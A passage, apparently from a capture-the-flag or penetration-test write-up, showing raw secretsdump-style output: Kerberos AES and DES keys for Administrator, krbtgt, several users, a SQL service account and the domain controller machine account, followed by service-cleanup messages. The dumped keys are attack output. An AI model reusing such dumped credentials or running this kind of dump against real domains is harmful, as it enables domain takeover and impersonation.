Administrator:des-cbc-md5:5d76e0d3c245a2a4
krbtgt:aes256-cts-hmac-sha1-96:b3f74f6e968fb5d2cf17f36f417bc46259623626953ed30f8faf3cd00b91c8de
krbtgt:aes128-cts-hmac-sha1-96:919e6861b6306e3367a9223a154473ec
krbtgt:des-cbc-md5:6d1f1cd391e01a91
Tom.Henn:aes256-cts-hmac-sha1-96:bb3886d7e3201d11055cf8a2ef587d83b448d33d77aab36dd84b4ce8c59fc0a2
Tom.Henn:aes128-cts-hmac-sha1-96:0a221bf0f01f109c86cc1668783b80d3
Tom.Henn:des-cbc-md5:1a46dc3858150401
Brandon.Brown:aes256-cts-hmac-sha1-96:1aad383c76610c43bf638873ff5d7f0d7cd5cffccdfb6dd16754f15b83217550
Brandon.Brown:aes128-cts-hmac-sha1-96:cb92957a61468212c2e1f26f2958b892
Brandon.Brown:des-cbc-md5:91b3a13edf6e6201
Ryan.Cooper:aes256-cts-hmac-sha1-96:b9a2b7df6161b9a31a15cfbbb17f68a5b3904eaa2ea21d8ed2ef9acb5e27b997
Ryan.Cooper:aes128-cts-hmac-sha1-96:cbe89554da97001fa8fd0967f1799104
Ryan.Cooper:des-cbc-md5:f4a445754f540104
sql_svc:aes256-cts-hmac-sha1-96:bcbbff82091c7c6f9875261d3ada97274d01b4a1f93ceb16e8154606e392a4ae
sql_svc:aes128-cts-hmac-sha1-96:decddf91c717c5a5b84e112f576ece3b
sql_svc:des-cbc-md5:73ae15efdafe751f
James.Roberts:aes256-cts-hmac-sha1-96:d503bb2c7eea7bf50e7f68ca967e4a6f8a903b22cffa07cf2c160580156f8a43
James.Roberts:aes128-cts-hmac-sha1-96:33c8d3d907cd51ffa5274ce0b16ba448
James.Roberts:des-cbc-md5:e53de99770a20bf2
Nicole.Thompson:aes256-cts-hmac-sha1-96:fd75cd1b02ed4cb838c996db6d7616157d19545c60fb23156abdb3a400bc371c
Nicole.Thompson:aes128-cts-hmac-sha1-96:0c86380c787deb624027e9d1d8d71ab2
Nicole.Thompson:des-cbc-md5:31b5e386b33e2589
DC$:aes256-cts-hmac-sha1-96:9290f280607a09f6dd56c89352c2259f0ad436f9f06396ddae0e68b6acb8d9e9
DC$:aes128-cts-hmac-sha1-96:0e1560a1c39112389c0edfd9e4e90e09
DC$:des-cbc-md5:2ae0f438f4b97623
[*] Cleaning up...
[*] Stopping service RemoteRegistry
[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.
[*] Cleaning up...
[*] Stopping service RemoteRegistry
```
